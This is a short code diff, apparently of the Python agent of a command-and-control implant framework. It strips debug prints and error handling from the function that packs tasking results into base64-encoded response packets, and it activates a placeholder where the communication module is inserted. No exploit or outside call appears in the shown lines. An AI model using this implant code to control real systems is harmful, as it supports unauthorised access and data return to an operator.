@@ -101,7 +101,7 @@ for headerRaw in headersRaw:
 #
 ################################################
 
-#REPLACE_COMMS
+REPLACE_COMMS
 
 
 ################################################
@@ -144,14 +144,12 @@ def build_response_packet(taskingID, packetData, resultID=0):
         |  2   |         2          |    2     |    2    |   4    | <Length>  |
         +------+--------------------+----------+---------+--------+-----------+
     """
-    print('response packet')
-    print('taskingID: ' + str(type(taskingID)))
-    print('packetData: ' + str(type(packetData)))
+
     packetType = struct.pack('=H', taskingID)
     totalPacket = struct.pack('=H', 1)
     packetNum = struct.pack('=H', 1)
     resultID = struct.pack('=H', resultID)
-    print('response packet 152')
+
     if packetData:
         if(isinstance(packetData, str)):
             packetData = base64.b64encode(packetData.encode('utf-8', 'ignore'))
@@ -159,15 +157,10 @@ def build_response_packet(taskingID, packetData, resultID=0):
             packetData = base64.b64encode(packetData.decode('utf-8').encode('utf-8','ignore'))
         if len(packetData) % 4:
             packetData += '=' * (4 - len(packetData) % 4)
-        print('if packet data: agent.py')
-        try:
-            length = struct.pack('=L',len(packetData))
-            print('length not the issue')
-        except Exception as e:
-            print(e)
+
+        length = struct.pack('=L',len(packetData))
         return packetType + totalPacket + packetNum + resultID + length + packetData
     else:
-        print('else packet data')
         length = struct.pack('=L', 0)
         return packetType + totalPacket + packetNum + resultID + length
 
